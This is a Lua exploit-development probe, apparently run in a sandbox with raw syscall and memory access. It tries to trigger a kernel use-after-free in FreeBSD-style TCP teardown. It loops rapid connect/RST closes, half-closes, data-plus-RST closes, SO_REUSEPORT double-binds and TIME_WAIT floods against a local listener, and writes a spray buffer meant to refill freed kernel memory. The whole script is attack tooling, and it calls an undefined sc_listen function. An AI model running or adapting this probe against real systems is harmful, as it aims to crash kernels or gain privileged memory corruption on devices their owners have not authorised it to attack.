-- CRASH_CLASS: MODERATE
-- PROBE 52b-worker: Multi-process TCP race condition — connector/RST sender
--
-- THEORY: Race the kernel's TCP connection teardown against the listener's
-- accept(). This script rapidly connects to the listener (52b_race_setup.lua)
-- and immediately closes with SO_LINGER(0) to send RST instead of FIN.
-- The RST triggers immediate TCB destruction in the kernel. If accept()
-- on the other process returns a fd to the TCB after the RST is processed,
-- we get a use-after-free.
--
-- LAUNCH ORDER: Send 52b_race_setup.lua FIRST on one TCP connection,
-- wait 2 seconds, then send this script on a SECOND TCP connection.
--
-- VARIANT ATTACKS:
--  A) SO_LINGER(0) close → RST (fastest teardown)
--  B) Half-close via shutdown(SHUT_WR) + close (exercises FIN_WAIT/CLOSE_WAIT)
--  C) Write data then RST (exercises receive buffer + teardown race)
--  D) Connect + immediate rebind to same port (TIME_WAIT assassination)

print("=== PROBE 52b-WORKER: TCP RACE CONNECTOR ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Syscall wrappers
local sc_getpid = make_syscall(20)
local sc_socket = make_syscall(97)
local sc_connect = make_syscall(98)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_write = make_syscall(4)
local sc_shutdown = make_syscall(134)
local sc_bind = make_syscall(104)
local sc_getsockopt = make_syscall(118)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("PID: " .. pid)

-- Constants
local AF_INET = 2
local SOCK_STREAM = 1
local SOL_SOCKET = 0xFFFF
local SO_LINGER = 0x0080
local SO_REUSEADDR = 0x0004
local SO_REUSEPORT = 0x0200
local SO_ERROR = 0x1007
local SHUT_WR = 1
local SHUT_RDWR = 2
local LISTEN_PORT = 31337

-- Build sockaddr_in for 127.0.0.1:<port>
local function build_sockaddr_in(port)
    local sa = memory.alloc(16)
    safe_wd(sa, 0)
    memory.write_byte(sa, 16)           -- sin_len
    memory.write_byte(sa + 1, AF_INET)  -- sin_family
    memory.write_byte(sa + 2, bit32.rshift(bit32.band(port, 0xFF00), 8))
    memory.write_byte(sa + 3, bit32.band(port, 0xFF))
    memory.write_byte(sa + 4, 0x7F)     -- 127.0.0.1
    memory.write_byte(sa + 5, 0x00)
    memory.write_byte(sa + 6, 0x00)
    memory.write_byte(sa + 7, 0x01)
    return sa
end

local target_sa = build_sockaddr_in(LISTEN_PORT)

-- Spray buffer: random-looking data to fill freed TCB memory
local spray_buf = memory.alloc(256)
for i = 0, 252, 4 do
    safe_wd(spray_buf + i, 0x41424344 + i)
end

-- Linger struct: l_onoff=1, l_linger=0 → RST on close
local linger_buf = memory.alloc(8)
safe_wd(linger_buf, 1)        -- l_onoff = 1
safe_wd(linger_buf + 4, 0)    -- l_linger = 0 seconds

local connect_count = 0
local connect_fail = 0
local rst_count = 0
local halfclose_count = 0
local dataclose_count = 0

print("[1] Starting rapid connect/RST loop to 127.0.0.1:" .. LISTEN_PORT)
print("    Variant A: SO_LINGER(0) RST close")
print("    Variant B: shutdown(SHUT_WR) half-close")
print("    Variant C: Write data + RST")
print("")

local TOTAL_ITERS = 500

for i = 1, TOTAL_ITERS do
    -- Create socket
    local fd = -1
    local sok = pcall(function()
        fd = to_num(sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0)))
    end)
    if not sok or fd < 0 then
        connect_fail = connect_fail + 1
        if connect_fail <= 3 then
            print("  [iter " .. i .. "] socket() failed: fd=" .. fd)
        end
    else
        -- Set SO_REUSEADDR for aggressive port recycling
        local opt1 = memory.alloc(4)
        safe_wd(opt1, 1)
        pcall(function()
            sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_REUSEADDR),
                uint64(opt1), uint64(4))
        end)

        -- Connect to listener
        local conn_ret = -999
        local cok = pcall(function()
            conn_ret = to_num(sc_connect(uint64(fd), uint64(target_sa), uint64(16)))
        end)

        if not cok or conn_ret ~= 0 then
            connect_fail = connect_fail + 1
            if connect_fail <= 5 then
                print("  [iter " .. i .. "] connect failed: ret=" .. conn_ret)
            end
            pcall(function() sc_close(uint64(fd)) end)
        else
            connect_count = connect_count + 1

            -- Pick a variant based on iteration to exercise different kernel paths
            local variant = (i % 3)

            if variant == 0 then
                -- VARIANT A: SO_LINGER(0) + close = immediate RST
                -- This is the fastest teardown — best race window
                pcall(function()
                    sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_LINGER),
                        uint64(linger_buf), uint64(8))
                end)
                pcall(function() sc_close(uint64(fd)) end)
                rst_count = rst_count + 1

            elseif variant == 1 then
                -- VARIANT B: shutdown(SHUT_WR) then close
                -- Exercises FIN_WAIT states — different kernel code path
                pcall(function()
                    sc_shutdown(uint64(fd), uint64(SHUT_WR))
                end)
                -- Small delay would help but we can't sleep; just close
                pcall(function() sc_close(uint64(fd)) end)
                halfclose_count = halfclose_count + 1

            else
                -- VARIANT C: Write data then RST-close
                -- Kernel must handle data in the send buffer during RST
                -- This exercises soreceive/sosend + teardown interaction
                pcall(function()
                    sc_write(uint64(fd), uint64(spray_buf), uint64(128))
                end)
                pcall(function()
                    sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_LINGER),
                        uint64(linger_buf), uint64(8))
                end)
                pcall(function() sc_close(uint64(fd)) end)
                dataclose_count = dataclose_count + 1
            end
        end
    end

    -- Progress every 100 iterations
    if i % 100 == 0 then
        print(string.format("  [iter %d] connected=%d failed=%d (RST=%d half=%d data=%d)",
            i, connect_count, connect_fail, rst_count, halfclose_count, dataclose_count))
    end
end

print("")
print("=== VARIANT D: SO_REUSEPORT double-bind race ===")
print("[2] Attempting simultaneous bind to same port as listener...")

-- Try to bind our own socket to the listener's port while it's active.
-- With SO_REUSEPORT, FreeBSD allows this. The kernel's bind path
-- walks the PCB hash and may race with the listener's accept loop.
local dbl_bind_count = 0
local dbl_bind_ok = 0

for i = 1, 50 do
    local fd = -1
    pcall(function()
        fd = to_num(sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0)))
    end)
    if fd >= 0 then
        local opt1 = memory.alloc(4)
        safe_wd(opt1, 1)
        pcall(function()
            sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_REUSEADDR),
                uint64(opt1), uint64(4))
        end)
        pcall(function()
            sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_REUSEPORT),
                uint64(opt1), uint64(4))
        end)

        local bind_sa = build_sockaddr_in(LISTEN_PORT)
        local br = -999
        pcall(function()
            br = to_num(sc_bind(uint64(fd), uint64(bind_sa), uint64(16)))
        end)
        dbl_bind_count = dbl_bind_count + 1
        if br == 0 then
            dbl_bind_ok = dbl_bind_ok + 1
            -- If bind succeeded, we now have TWO processes bound to same port!
            -- Try to listen and see what happens
            local lr = -999
            pcall(function()
                lr = to_num(sc_listen(uint64(fd), uint64(1)))
            end)
            if lr == 0 then
                print(string.format("  *** DOUBLE LISTEN on port %d! listen ret=%d", LISTEN_PORT, lr))
            end
        end
        pcall(function() sc_close(uint64(fd)) end)
    end
end

print(string.format("  Double-bind attempts: %d, succeeded: %d", dbl_bind_count, dbl_bind_ok))

-- === VARIANT E: TIME_WAIT port assassination ===
print("")
print("=== VARIANT E: TIME_WAIT state race ===")
print("[3] Rapid connect/close to create TIME_WAIT pile-up...")

-- Connect and close normally (FIN, not RST) to leave connections in TIME_WAIT.
-- Then try to rebind the source ports while TIME_WAIT entries exist.
local tw_count = 0
for i = 1, 100 do
    local fd = -1
    pcall(function()
        fd = to_num(sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0)))
    end)
    if fd >= 0 then
        local cr = -999
        pcall(function()
            cr = to_num(sc_connect(uint64(fd), uint64(target_sa), uint64(16)))
        end)
        if cr == 0 then
            -- Normal close (FIN) to create TIME_WAIT on listener side
            pcall(function() sc_close(uint64(fd)) end)
            tw_count = tw_count + 1
        else
            pcall(function() sc_close(uint64(fd)) end)
        end
    end
end
print(string.format("  TIME_WAIT connections created: %d", tw_count))

print("")
print("=== RACE WORKER RESULTS ===")
print("Total connection attempts: " .. (connect_count + connect_fail))
print("Successful connections: " .. connect_count)
print("Connection failures: " .. connect_fail)
print("  RST closes (variant A): " .. rst_count)
print("  Half-closes (variant B): " .. halfclose_count)
print("  Data+RST (variant C): " .. dataclose_count)
print("Double-bind successes: " .. dbl_bind_ok .. "/" .. dbl_bind_count)
print("TIME_WAIT pile-ups: " .. tw_count)
print("")
if connect_fail > connect_count then
    print("NOTE: High failure rate. Listener may have crashed (race success?)")
    print("      or port " .. LISTEN_PORT .. " is not reachable.")
    print("      Check 52b_race_setup output for anomalies/crashes.")
elseif dbl_bind_ok > 0 then
    print("*** DOUBLE-BIND SUCCEEDED — two processes on same port! ***")
    print("    This is a potential entry to PCB confusion attacks.")
end
print("")
print("=== PROBE 52b-WORKER COMPLETE ===")
